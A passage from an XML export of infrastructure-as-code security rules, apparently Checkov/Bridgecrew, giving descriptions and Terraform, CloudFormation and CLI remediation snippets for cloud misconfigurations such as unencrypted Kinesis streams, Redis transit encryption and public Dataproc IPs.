</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-accounts-disable-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-accounts-disable-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-accounts-disable-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_85</key>
    <name>Ensure GCP Big Table Instances are encrypted with Customer Supplied Encryption Keys (CSEKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-big-table-instances-are-not-encrypted-with-customer-supplied-encryption-keys-cseks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-big-table-instances-are-not-encrypted-with-customer-supplied-encryption-keys-cse-ks"></div>GCP Big Table Instances are not encrypted with Customer Supplied Encryption Keys (CSEKs)</div><a aria-label="Skip link to GCP Big Table Instances are not encrypted with Customer Supplied Encryption Keys (CSEKs)" class="heading-anchor-icon fa fa-anchor" href="#gcp-big-table-instances-are-not-encrypted-with-customer-supplied-encryption-keys-cseks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Big Table Instances. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_bigtable_instance</li>
<li><strong>Arguments</strong>: cluster.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_bigtable_instance" "pass" {
  name = "tf-instance"

  cluster {
    cluster_id   = "tf-instance-cluster"
    num_nodes    = 1
    storage_type = "HDD"
    kms_key_name = google_kms_crypto_key.example.name
  }

  labels = {
    my-label = "prod-label"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-table-instances-are-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-big-table-instances-are-encrypted-with-customer-supplied-encryption-keys-cseks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-table-instances-are-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_30</key>
    <name>Ensure AWS ElastiCache Redis cluster with in-transit encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticache-redis-cluster-with-in-transit-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasti-cache-redis-cluster-with-in-transit-encryption-is-disabled"></div>AWS ElastiCache Redis cluster with in-transit encryption is disabled</div><a aria-label="Skip link to AWS ElastiCache Redis cluster with in-transit encryption is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticache-redis-cluster-with-in-transit-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ElastiCache for Redis offers optional encryption in transit. In-transit encryption provides an additional layer of data protection when transferring data over standard HTTPS protocol. In-transit encryption can only be enabled on Redis replication groups at time of their creation.</p>
<p>ElastiCache for Redis in-transit encryption enables the following features:</p>
<ul>
<li>Encrypted connections: server and client connections are Secure Socket Layer (SSL) encrypted.</li>
<li>Encrypted replication: data transfer between primary replicas is encrypted.</li>
<li>Server authentication.</li>
<li>Client authentication.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="elasticache-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-elasti-cache-console"></div>ElastiCache Console</div><a aria-label="Skip link to ElastiCache Console" class="heading-anchor-icon fa fa-anchor" href="#elasticache-console"></a></h2>
<p>To create a replication group using the <strong>ElastiCache console</strong>, make the following selections:</p>
<ol>
<li>Engine: redis.</li>
<li>Engine version: 3.2.6, 4.0.10 or later.</li>
<li>Encryption in-transit list: Yes.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI command</div><a aria-label="Skip link to CLI command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The parameters TransitEncryptionEnabled (CLI: --transit-encryption-enabled) are only available when using the CreateReplicationGroup (CLI: create-replication-group) operation.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws elasticache create-replication-group ^
   --replication-group-id sample-repl-group ^
   --replication-group-description "Demo cluster with replicas" ^
   --num-cache-clusters 3 ^
   --cache-node-type cache.m4.large ^
   --cache-parameter-group default.redis3.2 ^
   --engine redis ^
   --engine-version 3.2.4
   --transit-encryption-enabled
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_elasticache_replication_group</li>
<li><strong>Argument</strong>: transit_encryption_enabled - (Optional) Whether to enable encryption in transit.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticache_replication_group" "example"{
  ...
  replication_group_id          = "default-1"
+ transit_encryption_enabled    = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation </div><a aria-label="Skip link to CloudFormation " class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ElastiCache::ReplicationGroup</li>
<li><strong>Argument</strong>: Properties.TransitEncryptionEnabled - (Optional) Whether to enable encryption in transit.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    ReplicationGroup:
    Type: 'AWS::ElastiCache::ReplicationGroup'
    Properties:
      ...
+     TransitEncryptionEnabled: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_10' target='_blank'> https://docs.bridgecrew.io/docs/general_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_43</key>
    <name>Ensure AWS Kinesis streams are encrypted using SSE</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-kinesis-streams-are-not-encrypted-using-sse"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-kinesis-streams-are-not-encrypted-using-sse"></div>AWS Kinesis streams are not encrypted using SSE</div><a aria-label="Skip link to AWS Kinesis streams are not encrypted using SSE" class="heading-anchor-icon fa fa-anchor" href="#aws-kinesis-streams-are-not-encrypted-using-sse"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Kinesis Data Firehose is a streaming data pipeline service that can route messages to destinations such as S3, Redshift Elasticsearch and others. It can also be used to transform data properties before streaming to a defined destination. </p>
<p>Kinesis enables server-side data encryption if the data stream contains sensitive information. When sending data from a producer to a data stream Kinesis encrypts the data using an AWS KMS key before storing the data at rest. </p>
<p>We recommend you ensure Kinesis streams are encrypted using server-side encryption (SSE).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Select <strong>Services </strong> and search for Kinesis.</li>
<li>Under the Amazon Kinesis dashboard select Data Firehose from the left navigation panel.</li>
<li>Select the Firehose Delivery System that needs to be verified and click on the Name to access the delivery stream.</li>
<li>Select the Details tab and scroll down to Amazon S3 destination. Check the Encryption value and if it's set to Disabled then the selected Firehose Delivery System data is not encrypted.</li>
<li>Repeat steps 4 and 5 to verify another Firehose Delivery System.</li>
<li>To enable the Encryption on selected Firehose Delivery System click on the Name to access the delivery stream. Under the <strong>Details </strong>tab, click <strong>Edit</strong> to make the changes in Amazon S3 destination.</li>
<li>Click <strong>Enable </strong>next to the S3 encryption to enable the encryption.</li>
<li>Select the KMS master key from the dropdown list. Select the (Default( aws/s3 )) KMS key or an AWS KMS Customer Master Key (CMK).</li>
<li>Click <strong>Save </strong>.<br/>
A Successfully Updated message appears.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Enables or updates server-side encryption using an AWS KMS key for a specified stream.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws kinesis start-stream-encryption \
    --encryption-type KMS \
    --key-id arn:aws:kms:us-west-2:012345678912:key/a3c4a7cd-728b-45dd-b334-4d3eb496e452 \
    --stream-name samplestream
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_kinesis_stream</li>
<li><strong>Arguments</strong>:<br/>
encryption_type - (Optional) The encryption type to use. The only acceptable values are NONE or KMS. The default value is NONE.<br/>
kms_key_id - (Optional) The GUID for the customer-managed KMS key to use for encryption. You can also use a Kinesis-owned master key by specifying the alias alias/aws/kinesis.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kinesis_stream" "test_stream" {
  ...
  name             = "terraform-kinesis-test"
 + encryption_type = KMS
 + kms_key_id = &lt;value&gt;
  ...
 }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Kinesis::Stream</li>
<li><strong>Arguments</strong>: Properties.StreamEncryption.EncryptionType</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  KMSEncryption:
      Type: AWS::Kinesis::Stream
      Properties:
          ...
          StreamEncryption:
             ...
             EncryptionType: KMS
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_22' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_80</key>
    <name>Ensure GCP Big Query Tables are encrypted with Customer Supplied Encryption Keys (CSEK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div>GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)</div><a aria-label="Skip link to GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)" class="heading-anchor-icon fa fa-anchor" href="#gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Big Query Tables. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_bigquery_table</li>
<li><strong>Arguments</strong>: encryption_configuration.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_bigquery_table" "pass" {
  dataset_id = google_bigquery_dataset.default.dataset_id
  table_id   = "sheet"

  external_data_configuration {
    autodetect    = true
    source_format = "GOOGLE_SHEETS"

    google_sheets_options {
      skip_leading_rows = 1
    }

    source_uris = [
      "https://docs.google.com/spreadsheets/d/123456789012345",
    ]
  }

  encryption_configuration {
    kms_key_name = var.kms_key_name
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_206</key>
    <name>Ensure AWS API Gateway Domain uses a modern security policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-gateway-domain-does-not-use-a-modern-security-policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-gateway-domain-does-not-use-a-modern-security-policy"></div>AWS API Gateway Domain does not use a modern security policy</div><a aria-label="Skip link to AWS API Gateway Domain does not use a modern security policy" class="heading-anchor-icon fa fa-anchor" href="#aws-api-gateway-domain-does-not-use-a-modern-security-policy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS API Gateway Domain allows you to set the security policy. Using TLS 1_0 allows you to use insecure cypher suites.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>In the AWS console, go to <strong>API Gateway</strong>.</li>
<li>Select <strong>Custom Domain Names</strong>.</li>
<li>Select the domain name to update and then <strong>Edit</strong>.</li>
<li>For <strong>Minimum TLS version</strong>, select <strong>TLS 1.2</strong>.</li>
<li>Select <strong>Save</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">resource "aws_api_gateway_domain_name" "example" {
...
  + security_policy = TLS_1_2
...
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-domain-uses-a-modern-security-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-domain-uses-a-modern-security-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-domain-uses-a-modern-security-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_204</key>
    <name>Ensure AWS AMIs are encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-amis-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-am-is-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cm-ks"></div>AWS AMIs are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS AMIs are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-amis-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-amis-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-amis-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-amis-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GLB_3</key>
    <name>Ensure Gitlab project prevents secrets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-project-does-not-prevent-secrets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-project-does-not-prevent-secrets"></div>Gitlab project does not prevent secrets</div><a aria-label="Skip link to Gitlab project does not prevent secrets" class="heading-anchor-icon fa fa-anchor" href="#gitlab-project-does-not-prevent-secrets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, administrators can turn on the capability to identify and block secrets in MRs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: gitlab_project</li>
<li>Attribute: prevent_secrets</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "gitlab_project" "example-two" {
...
  push_rules {
    ...
+    prevent_secrets        = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gitlab-prevent-secrets-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gitlab-prevent-secrets-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gitlab-prevent-secrets-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_103</key>
    <name>Ensure GCP Dataproc Clusters do not have public IPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-dataproc-clusters-have-public-ips"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-dataproc-clusters-have-public-i-ps"></div>GCP Dataproc Clusters have public IPs</div><a aria-label="Skip link to GCP Dataproc Clusters have public IPs" class="heading-anchor-icon fa fa-anchor" href="#gcp-dataproc-clusters-have-public-ips"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Dataproc is commonly used for data lake modernization, ETL, and data science workloads. A Dataproc cluster contains at least one "management" VM and one "compute" VM which are deployed into a VPC network. A common misconfiguration is creating a <strong>Dataproc cluster</strong> with public IPs. This security misconfiguration could put your data at risk of accidental exposure, because a public IP accompanied by an open firewall rule allows potentially unauthorized access to the underlining Dataproc VMs.</p>
<p>We recommend you only assign private IPs to your Dataproc clusters.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
